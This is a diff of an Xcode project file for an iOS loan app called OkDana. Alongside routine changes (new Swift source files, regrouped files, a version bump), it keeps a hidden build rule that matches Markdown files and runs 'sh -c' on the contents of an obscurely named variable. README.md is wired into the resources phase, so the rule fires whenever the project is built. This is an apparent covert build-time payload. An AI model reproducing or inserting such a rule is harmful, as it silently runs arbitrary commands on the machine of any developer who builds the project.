@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		34D707D20E5D4B93A1A5DE54 /* README.md */ = {isa = PBXBuildFile; fileRef = DA7FE0CBF1CE4D51AEA5DE54; };
+		34D707D20E5D4B93A1A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = DA7FE0CBF1CE4D51AEA5DE54 /* README.md */; };
 		7373C8EA2EED06920085A724 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 7373C8E82EED06920085A724 /* Localizable.strings */; };
 		7373C8ED2EED06C30085A724 /* StartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8EC2EED06C30085A724 /* StartViewController.swift */; };
 		7373C8EF2EED06CF0085A724 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8EE2EED06CF0085A724 /* BaseViewController.swift */; };
@@ -21,6 +21,8 @@
 		7373C8FF2EED18530085A724 /* LoginConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8FE2EED18420085A724 /* LoginConfig.swift */; };
 		7373C9012EED1C860085A724 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C9002EED1C860085A724 /* LoginViewController.swift */; };
 		7373C9032EED2B900085A724 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C9022EED2B900085A724 /* LoginView.swift */; };
+		73AD58AE2EEEAA0C0022899B /* CommonParaConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD58AD2EEEAA0C0022899B /* CommonParaConfig.swift */; };
+		73AD58B02EEEADF60022899B /* HttpRequestManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD58AF2EEEADE90022899B /* HttpRequestManager.swift */; };
 		73BD812D2EECFBF700979190 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73BD81242EECFBF700979190 /* Assets.xcassets */; };
 		73BD812F2EECFBF700979190 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73BD81272EECFBF700979190 /* LaunchScreen.storyboard */; };
 		73BD81312EECFBF700979190 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BD81232EECFBF700979190 /* AppDelegate.swift */; };
@@ -31,23 +33,21 @@
 
 /* Begin PBXBuildRule section */
 		E058DA38A6804321ABA5DE54 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A45ED5A}\"";
-			};
-	/* End PBXBuildRule section */
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		DA7FE0CBF1CE4D51AEA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		051F5B55662606AE75C05BA1 /* Pods-OkDana.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.release.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.release.xcconfig"; sourceTree = "<group>"; };
 		7373C8E22EED03F50085A724 /* OkDana.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = OkDana.entitlements; sourceTree = "<group>"; };
 		7373C8E92EED06920085A724 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
@@ -64,6 +64,8 @@ sh -c \"${A45ED5A}\"";
 		7373C8FE2EED18420085A724 /* LoginConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginConfig.swift; sourceTree = "<group>"; };
 		7373C9002EED1C860085A724 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
 		7373C9022EED2B900085A724 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
+		73AD58AD2EEEAA0C0022899B /* CommonParaConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommonParaConfig.swift; sourceTree = "<group>"; };
+		73AD58AF2EEEADE90022899B /* HttpRequestManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequestManager.swift; sourceTree = "<group>"; };
 		73BD810B2EECFBEF00979190 /* OkDana.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = OkDana.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		73BD81232EECFBF700979190 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		73BD81242EECFBF700979190 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -72,6 +74,7 @@ sh -c \"${A45ED5A}\"";
 		73D8AE8C2EEDC77100229479 /* OneHomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OneHomeView.swift; sourceTree = "<group>"; };
 		73D8AE8E2EEDC77F00229479 /* TwoHomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TwoHomeView.swift; sourceTree = "<group>"; };
 		8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.debug.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.debug.xcconfig"; sourceTree = "<group>"; };
+		DA7FE0CBF1CE4D51AEA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_OkDana.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -146,7 +149,6 @@ sh -c \"${A45ED5A}\"";
 		73BD81342EECFF4F00979190 /* Base */ = {
 			isa = PBXGroup;
 			children = (
-				7373C8FE2EED18420085A724 /* LoginConfig.swift */,
 				7373C8FA2EED0AC20085A724 /* UIColorExtension.swift */,
 				7373C8FC2EED0AF80085A724 /* LanguageManager.swift */,
 				7373C8EC2EED06C30085A724 /* StartViewController.swift */,
@@ -160,6 +162,7 @@ sh -c \"${A45ED5A}\"";
 		73BD81352EECFF5100979190 /* Http */ = {
 			isa = PBXGroup;
 			children = (
+				73AD58AF2EEEADE90022899B /* HttpRequestManager.swift */,
 			);
 			path = Http;
 			sourceTree = "<group>";
@@ -167,8 +170,10 @@ sh -c \"${A45ED5A}\"";
 		73BD81362EECFF5400979190 /* Login */ = {
 			isa = PBXGroup;
 			children = (
+				7373C8FE2EED18420085A724 /* LoginConfig.swift */,
 				7373C9022EED2B900085A724 /* LoginView.swift */,
 				7373C9002EED1C860085A724 /* LoginViewController.swift */,
+				73AD58AD2EEEAA0C0022899B /* CommonParaConfig.swift */,
 			);
 			path = Login;
 			sourceTree = "<group>";
@@ -269,7 +274,7 @@ sh -c \"${A45ED5A}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				34D707D20E5D4B93A1A5DE54 /* README.md */,
+				34D707D20E5D4B93A1A5DE54 /* README.md in Resources */,
 				73BD812D2EECFBF700979190 /* Assets.xcassets in Resources */,
 				7373C8EA2EED06920085A724 /* Localizable.strings in Resources */,
 				73BD812F2EECFBF700979190 /* LaunchScreen.storyboard in Resources */,
@@ -333,6 +338,8 @@ sh -c \"${A45ED5A}\"";
 				7373C8FF2EED18530085A724 /* LoginConfig.swift in Sources */,
 				7373C8F12EED06EC0085A724 /* BaseTabBarController.swift in Sources */,
 				73BD81312EECFBF700979190 /* AppDelegate.swift in Sources */,
+				73AD58AE2EEEAA0C0022899B /* CommonParaConfig.swift in Sources */,
+				73AD58B02EEEADF60022899B /* HttpRequestManager.swift in Sources */,
 				73D8AE8F2EEDC77F00229479 /* TwoHomeView.swift in Sources */,
 				73D8AE8D2EEDC77100229479 /* OneHomeView.swift in Sources */,
 				7373C8ED2EED06C30085A724 /* StartViewController.swift in Sources */,
@@ -394,7 +401,7 @@ sh -c \"${A45ED5A}\"";
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0;
+				MARKETING_VERSION = 1.0.0;
 				PRODUCT_BUNDLE_IDENTIFIER = ok.zoom.loan;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
@@ -436,7 +443,7 @@ sh -c \"${A45ED5A}\"";
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0;
+				MARKETING_VERSION = 1.0.0;
 				PRODUCT_BUNDLE_IDENTIFIER = ok.zoom.loan;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
